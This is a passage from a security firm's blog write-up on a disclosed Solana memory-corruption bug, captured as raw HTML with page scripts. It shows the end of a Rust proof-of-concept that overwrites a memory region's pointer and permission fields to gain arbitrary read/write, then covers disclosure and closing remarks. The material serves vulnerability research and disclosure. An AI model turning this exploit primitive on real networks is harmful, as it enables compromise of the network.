</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">60</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> arb_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> accounts</span><span class="token token" style="color:#ccc">[</span><span>pointer_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">61</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">62</span><span>            </span><span class="token token" style="color:#cc99cd">loop</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">63</span><span>                </span><span class="token token" style="color:#999">// Signature matching to reliably identify MemoryRegion</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">64</span><span>                </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x18</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020a238</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">65</span><span>                   </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x58</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400202908</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">66</span><span>                   </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x98</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020f308</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">67</span><span>                   </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0xd8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400000000</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">68</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">69</span><span>                    </span><span class="token token" style="color:#cc99cd">let</span><span> thread_mem </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x48</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">70</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">71</span><span>                    </span><span class="token token" style="color:#999">// Overwrite POINTER account&#x27;s backing buffer pointer (arb_ptr)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">72</span><span>                    </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x490</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> thread_mem</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">73</span><span>                    </span><span class="token token" style="color:#999">// Set memory region state to writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">74</span><span>                    </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x4b8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">75</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">76</span><span>                    </span><span class="token token" style="color:#999">// At this point, arb_ptr (accounts[pointer_idx]) points to arbitrary memory.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">77</span><span>                    </span><span class="token token" style="color:#999">// ROP chain setup would occur here (omitted).</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">78</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">79</span><span>                    </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">80</span><span>                </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">81</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">82</span><span>                </span><span class="token token" style="color:#999">// Move to next potential MemoryRegion structure</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">83</span><span>                data_ptr </span><span class="token token" style="color:#67cdcc">+=</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x08</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#f08d49">4</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">4</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">84</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">85</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">86</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">87</span><span>        </span><span class="token token" style="color:#999">// Note: computation budget exhaustion may be necessary in real-world scenarios</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">88</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">89</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">90</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">91</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">92</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">After successfully getting arbitrary read/write, remote code execution (RCE) would be achievable using traditional binary exploitation tricks.</p>
<div class="relative w-full pb-[56.25%]">
  <iframe class="absolute top-0 left-0 w-full h-full" src="https://www.youtube.com/embed/qlnRNFnFaXM?si=9nCPqBPqxjFJQHHb" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"></iframe>
</div>
<p class="text-xl py-3 text-pretty sm:text-justify">Notably, the PoCs shown here is no where near stable enough to launch an attack against an active Solana network. Specifically, we haven&#x27;t implemented account spraying, and also used hardcoded offsets for calculating thread stack and ROPgadgets. However, there are well-established approaches in weaponizing such PoCs into exploits, and we leave this as an exercise for interested readers.</p>
<h2 class="text-4xl py-4 border-b border-white/10">Final Thoughts</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">As demonstrated, even memory-safe languages like Rust can harbor subtle and powerful vulnerabilities, especially in complex systems utilizing unsafe code to push the boundaries of performance and optimization. <strong>What began as a curiosity about Solana’s JIT and memory model evolved into a critical finding that could have compromised the integrity of the entire network.</strong></p>
<p class="text-xl py-3 text-pretty sm:text-justify">During our disclosure of the bug to Solana, the team was highly responsive, and also fast to understand the concepts discussed in the report. They also made significant decisions such as putting the Direct Mapping feature on hold for further scrutiny, instead of hastily launching it to meet deadlines. While bugs are inevitable, Solana&#x27;s professional handling of bug disclosures shows their commitment to security, and demonstrates why it deserves to be a top tier project.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">We had a lot of fun exploring this bug. Reading through code, understanding system design at a deep level, and crafting a non-obvious exploit path. These are the kinds of challenges we live for. Hopefully, this write-up sheds light on how the bug hunting process really works. It is not just about the final exploit, but about the twists, dead ends, and intuition that lead there. We hope you enjoyed reading it as much as we enjoyed the journey.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">At Anatomist Security, we specialize in uncovering such vulnerabilities through deep technical research and rigorous security audits. If you&#x27;re building complex software, especially in fast-moving areas like blockchain, and want to ensure its robustness, reach out. We&#x27;d love to help.</p><style>
mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
  min-height: 1px;
  min-width: 1px;
}

mjx-container[jax="SVG"] > svg a {
  fill: blue;
  stroke: blue;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][display="true"][width="full"] {
  display: flex;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line], svg[data-table] > g > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame], svg[data-table] > g > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed, svg[data-table] > g > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted, svg[data-table] > g > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > g > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
  stroke-width: 3;
}
</style></article></div><div class="absolute inset-x-0 top-[calc(100%-13rem)] -z-10 transform-gpu overflow-hidden blur-3xl sm:top-[calc(100%-30rem)]" aria-hidden="true"><div class="relative left-[calc(50%+3rem)] aspect-[1155/678] w-[36.125rem] -translate-x-1/2 bg-gradient-to-tr from-accent3 to-primary opacity-30 sm:left-[calc(50%+36rem)] sm:w-[72.1875rem]" style="clip-path:polygon(74.1% 44.1%, 100% 61.6%, 97.5% 26.9%, 85.5% 0.1%, 80.7% 2%, 72.5% 32.5%, 60.2% 62.4%, 52.4% 68.1%, 47.5% 58.3%, 45.2% 34.5%, 27.5% 76.7%, 0.1% 64.9%, 17.9% 100%, 27.6% 76.8%, 76.1% 97.7%, 74.1% 44.1%)"></div></div></main><footer class="relative isolate overflow-hidden bg-black pt-16 pb-6"><div class="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-accent2 via-primary to-accent3"></div><div class="relative z-10 mx-auto flex max-w-6xl flex-col items-center gap-8 px-4"><div class="grid w-full grid-cols-2 gap-12 text-base text-white sm:grid-cols-4 sm:text-lg"><div><h4 class="mb-4 font-urbanist text-xl font-semibold sm:text-2xl">Social</h4><div class="flex gap-5"><a href="https://x.com/th3anatomist" target="_blank" class="hover:scale-110 transition"><img alt="X" loading="lazy" width="36" height="36" decoding="async" data-nimg="1" style="color:transparent" src="/x_icon.svg"/></a><a href="https://t.me/th3anatomist" target="_blank" class="hover:scale-110 transition"><img alt="Telegram" loading="lazy" width="40" height="40" decoding="async" data-nimg="1" style="color:transparent" src="/telegram_icon.svg"/></a></div></div><div><h4 class="mb-4 font-urbanist text-xl font-semibold sm:text-2xl">Email</h4><p class="text-primary hover:underline break-all sm:text-lg"><a href="mailto:contact@anatomi.st">contact@anatomi.st</a></p></div><div><h4 class="mb-4 font-urbanist text-xl font-semibold sm:text-2xl">Phone</h4><p class="text-primary sm:text-lg">(+886) 2‑2304‑0080</p></div><div><h4 class="mb-4 font-urbanist text-xl font-semibold sm:text-2xl">Address</h4><p class="text-primary leading-relaxed sm:text-lg whitespace-nowrap">No. 128, Heping W. Rd. <br/>Zhongzheng Dist., Taipei, Taiwan</p></div></div><p class="text-center font-urbanist text-sm text-white/60 sm:text-base">© Anatomist Security <!-- -->2025<!-- --> | All rights reserved</p></div></footer><!--$--><!--/$--><!--$--><!--/$--><script src="/_next/static/chunks/webpack-614d967e4679fa1b.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[7555,[],\"\"]\n3:I[1295,[],\"\"]\n5:I[9665,[],\"MetadataBoundary\"]\n7:I[9665,[],\"OutletBoundary\"]\na:I[4911,[],\"AsyncMetadataOutlet\"]\nc:I[9665,[],\"ViewportBoundary\"]\ne:I[6614,[],\"\"]\n:HL[\"/_next/static/media/8360eb76cbf3c3fd-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/981f1daddbf10233-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/56704f9b52fbed47.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"EXTc_vOw7furB0RbSq0Oq\",\"p\":\"\",\"c\":[\"\",\"blog\",\"2025_06_27_pwning_solana_for_fun_and_profit\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"blog\",{\"children\":[[\"slug\",\"2025_06_27_pwning_solana_for_fun_and_profit\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/56704f9b52fbed47.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"__variable_0f85a8 antialiased\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"blog\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"2025_06_27_pwning_solana_for_fun_and_profit\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L4\",[\"$\",\"$L5\",null,{\"children\":\"$L6\"}],null,[\"$\",\"$L7\",null,{\"children\":[\"$L8\",\"$L9\",[\"$\",\"$La\",null,{\"promise\":\"$@b\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"sUW3CF2ReIDPNebUNGE8G\",{\"children\":[[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$e\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"f:\"$Sreact.suspense\"\n10:I[4911,[],\"AsyncMetadata\"]\n6:[\"$\",\"$f\",null,{\"fallback\":null,\"children\":[\"$\",\"$L10\",null,{\"promise\":\"$@11\"}]}]\n"])</script><script>self.__next_f.push([1,"12:I[4464,[\"261\",\"static/chunks/261-863ea0bd4c945dc7.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-2436fd1eab0440fc.js\"],\"default\"]\n13:I[6874,[\"261\",\"static/chunks/261-863ea0bd4c945dc7.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-2436fd1eab0440fc.js\"],\"*\"]\n15:I[5333,[\"261\",\"static/chunks/261-863ea0bd4c945dc7.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-2436fd1eab0440fc.js\"],\"Footer\"]\n9:null\n14:T811,"])</script><script>self.__next_f.push([1,"\nmjx-container[jax=\"SVG\"] {\n  direction: ltr;\n}\n\nmjx-container[jax=\"SVG\"] \u003e svg {\n  overflow: visible;\n  min-height: 1px;\n  min-width: 1px;\n}\n\nmjx-container[jax=\"SVG\"] \u003e svg a {\n  fill: blue;\n  stroke: blue;\n}\n\nmjx-container[jax=\"SVG\"][display=\"true\"] {\n  display: block;\n  text-align: center;\n  margin: 1em 0;\n}\n\nmjx-container[jax=\"SVG\"][display=\"true\"][width=\"full\"] {\n  display: flex;\n}\n\nmjx-container[jax=\"SVG\"][justify=\"left\"] {\n  text-align: left;\n}\n\nmjx-container[jax=\"SVG\"][justify=\"right\"] {\n  text-align: right;\n}\n\ng[data-mml-node=\"merror\"] \u003e g {\n  fill: red;\n  stroke: red;\n}\n\ng[data-mml-node=\"merror\"] \u003e rect[data-background] {\n  fill: yellow;\n  stroke: none;\n}\n\ng[data-mml-node=\"mtable\"] \u003e line[data-line], svg[data-table] \u003e g \u003e line[data-line] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node=\"mtable\"] \u003e rect[data-frame], svg[data-table] \u003e g \u003e rect[data-frame] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node=\"mtable\"] \u003e .mjx-dashed, svg[data-table] \u003e g \u003e .mjx-dashed {\n  stroke-dasharray: 140;\n}\n\ng[data-mml-node=\"mtable\"] \u003e .mjx-dotted, svg[data-table] \u003e g \u003e .mjx-dotted {\n  stroke-linecap: round;\n  stroke-dasharray: 0,140;\n}\n\ng[data-mml-node=\"mtable\"] \u003e g \u003e svg {\n  overflow: visible;\n}\n\n[jax=\"SVG\"] mjx-tool {\n  display: inline-block;\n  position: relative;\n  width: 0;\n  height: 0;\n}\n\n[jax=\"SVG\"] mjx-tool \u003e mjx-tip {\n  position: absolute;\n  top: 0;\n  left: 0;\n}\n\nmjx-tool \u003e mjx-tip {\n  display: inline-block;\n  padding: .2em;\n  border: 1px solid #888;\n  font-size: 70%;\n  background-color: #F8F8F8;\n  color: black;\n  box-shadow: 2px 2px 5px #AAAAAA;\n}\n\ng[data-mml-node=\"maction\"][data-toggle] {\n  cursor: pointer;\n}\n\nmjx-status {\n  display: block;\n  position: fixed;\n  left: 1em;\n  bottom: 1em;\n  min-width: 25%;\n  padding: .2em .4em;\n  border: 1px solid #888;\n  font-size: 90%;\n  background-color: #F8F8F8;\n  color: black;\n}\n\nforeignObject[data-mjx-xml] {\n  font-family: initial;\n  line-height: normal;\n  overflow: visible;\n}\n\nmjx-container[jax=\"SVG\"] path[data-c], mjx-container[jax=\"SVG\"] use[data-c] {\n  stroke-width: 3;\n}\n"])</script><script>self.__next_f.push([1,"4:[[\"$\",\"$L12\",null,{}],[\"$\",\"main\",null,{\"className\":\"relative isolate bg-black px-6 py-24 pt-32 sm:py-32 lg:px-8 min-h-screen\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute inset-x-0 -top-40 -z-10 transform-gpu overflow-hidden blur-3xl sm:-top-80\",\"aria-hidden\":\"true\",\"children\":[\"$\",\"div\",null,{\"className\":\"relative left-[calc(50%-11rem)] aspect-[1155/678] w-[36.125rem] -translate-x-1/2 rotate-[30deg] bg-gradient-to-tr from-accent2 to-accent3 opacity-30 sm:left-[calc(50%-30rem)] sm:w-[72.1875rem]\",\"style\":{\"clipPath\":\"polygon(74.1% 44.1%, 100% 61.6%, 97.5% 26.9%, 85.5% 0.1%, 80.7% 2%, 72.5% 32.5%, 60.2% 62.4%, 52.4% 68.1%, 47.5% 58.3%, 45.2% 34.5%, 27.5% 76.7%, 0.1% 64.9%, 17.9% 100%, 27.6% 76.8%, 76.1% 97.7%, 74.1% 44.1%)\"}}]}],[\"$\",\"div\",null,{\"className\":\"mx-auto max-w-4xl\",\"children\":[\"$\",\"article\",null,{\"className\":\"prose prose-invert prose-lg lg:prose-xl prose-headings:font-urbanist prose-headings:bg-gradient-to-r prose-headings:from-accent1 prose-headings:via-primary prose-headings:to-secondary prose-headings:bg-clip-text prose-headings:text-transparent prose-a:text-accent1 